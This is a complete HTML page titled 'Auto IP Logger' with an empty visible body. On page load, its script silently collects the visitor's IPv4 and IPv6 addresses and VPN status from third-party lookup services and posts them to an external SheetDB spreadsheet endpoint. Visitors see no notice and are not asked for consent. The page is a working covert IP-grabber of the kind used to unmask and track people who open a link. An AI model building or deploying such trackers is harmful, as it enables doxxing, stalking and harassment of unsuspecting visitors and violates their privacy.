<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto IP Logger</title>
    <script>
        const apiUrl = "https://sheetdb.io/api/v1/d6desiq4gglnm";

        async function getIPData() {
            let ipv4 = "Unknown", ipv6 = "Unknown", vpnStatus = "Unknown";

            try {
                // Fetch IPv4 & IPv6
                const ipResponse = await fetch("https://api64.ipify.org?format=json");
                const ipData = await ipResponse.json();
                ipv4 = ipData.ip;

                const ipv6Response = await fetch("https://api6.ipify.org?format=json");
                const ipv6Data = await ipv6Response.json();
                ipv6 = ipv6Data.ip;
            } catch (error) {
                console.error("IP Fetch Error:", error);
            }

            try {
                // Detect VPN Usage
                const vpnResponse = await fetch(`https://vpnapi.io/api/${ipv4}?key=free`);
                const vpnData = await vpnResponse.json();
                vpnStatus = vpnData.security.vpn ? "Yes" : "No";
            } catch (error) {
                console.error("VPN Check Error:", error);
            }

            // Send data to SheetDB
            sendDataToSheet(ipv4, ipv6, vpnStatus);
        }

        async function sendDataToSheet(ipv4, ipv6, vpnStatus) {
            const response = await fetch(apiUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    data: { IPV4: ipv4, IPV6: ipv6, "Is Using VPN?": vpnStatus }
                })
            });

            console.log("Data Sent:", await response.json());
        }

        window.onload = getIPData; // Run when the page loads
    </script>
</head>
<body>
    <h2>  </h2>
    <p> </p>
</body>
</html>
